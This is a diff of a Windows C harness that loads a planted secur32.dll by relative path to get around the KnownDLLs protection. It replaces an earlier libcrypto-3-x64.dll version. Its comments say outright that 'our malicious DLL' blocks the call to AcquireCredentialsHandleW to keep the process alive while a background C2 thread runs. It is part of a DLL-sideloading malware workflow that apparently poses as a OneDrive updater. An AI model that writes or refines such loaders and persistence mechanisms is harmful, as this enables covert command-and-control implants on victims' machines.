@@ -1,47 +1,44 @@
 #include <windows.h>
 #include <stdio.h>
 
-// Function pointer type for OPENSSL_init_crypto
-typedef int (*OPENSSL_init_crypto_ptr)(unsigned long long, const unsigned char*);
+// Signature for AcquireCredentialsHandleW from secur32.dll
+typedef LONG (WINAPI *AcquireCredentialsHandleW_t)(
+    LPWSTR  pszPrincipal,
+    LPWSTR  pszPackage,
+    ULONG   fCredentialUse,
+    PVOID   pvLogonId,
+    PVOID   pAuthData,
+    PVOID   pGetKeyFn,
+    PVOID   pvGetKeyArgument,
+    PVOID   phCredential,
+    PVOID   ptsExpiry
+);
 
 int main()
 {
     HMODULE hLib = NULL;
-    OPENSSL_init_crypto_ptr pOpenSSL_init_crypto = NULL;
+    AcquireCredentialsHandleW_t pAcquireCredentialsHandleW = NULL;
 
-    printf("OneDriveStandaloneUpdater.exe: Starting up...\n");
-    printf("OneDriveStandaloneUpdater.exe: Attempting to load libcrypto-3-x64.dll...\n");
+    // Use a relative path to force the loader to look in the local directory first,
+    // bypassing the KnownDLLs check for secur32.dll.
+    hLib = LoadLibraryW(L".\\secur32.dll");
 
-    // We use a relative path to force the loader to look in the local directory first,
-    // bypassing the KnownDLLs check if applicable (though libcrypto is not a KnownDLL).
-    hLib = LoadLibraryW(L".\\libcrypto-3-x64.dll");
-    
     if (hLib != NULL)
     {
-        printf("OneDriveStandaloneUpdater.exe: libcrypto-3-x64.dll loaded successfully.\n");
+        // Resolve AcquireCredentialsHandleW - our custom DLL will block here indefinitely
+        pAcquireCredentialsHandleW = (AcquireCredentialsHandleW_t)GetProcAddress(hLib, "AcquireCredentialsHandleW");
 
-        // Get the address of OPENSSL_init_crypto
-        pOpenSSL_init_crypto = (OPENSSL_init_crypto_ptr)GetProcAddress(hLib, "OPENSSL_init_crypto");
-        
-        if (pOpenSSL_init_crypto != NULL)
+        if (pAcquireCredentialsHandleW != NULL)
         {
-            printf("OneDriveStandaloneUpdater.exe: Calling OPENSSL_init_crypto (this should block indefinitely if DLL is persistent)...\n");
-            // Call the function. In our custom DLL, this will block the main thread.
-            // This simulates the behavior of a legitimate application initializing OpenSSL.
-            pOpenSSL_init_crypto(0, NULL);
-            printf("OneDriveStandaloneUpdater.exe: OPENSSL_init_crypto returned (this should not happen if DLL is persistent).\n");
+            // Call the function - our malicious DLL blocks the main thread here,
+            // keeping the process alive while the background C2 thread runs.
+            pAcquireCredentialsHandleW(
+                NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL
+            );
         }
-        else
-        {
-            printf("OneDriveStandaloneUpdater.exe: Could not find OPENSSL_init_crypto in libcrypto-3-x64.dll. Error: %lu\n", GetLastError());
-        }
+
         FreeLibrary(hLib);
     }
-    else
-    {
-        printf("OneDriveStandaloneUpdater.exe: Failed to load libcrypto-3-x64.dll. Error: %lu\n", GetLastError());
-    }
 
-    printf("OneDriveStandaloneUpdater.exe: Exiting (this line should not be reached if DLL is persistent).\n");
     return 0;
 }
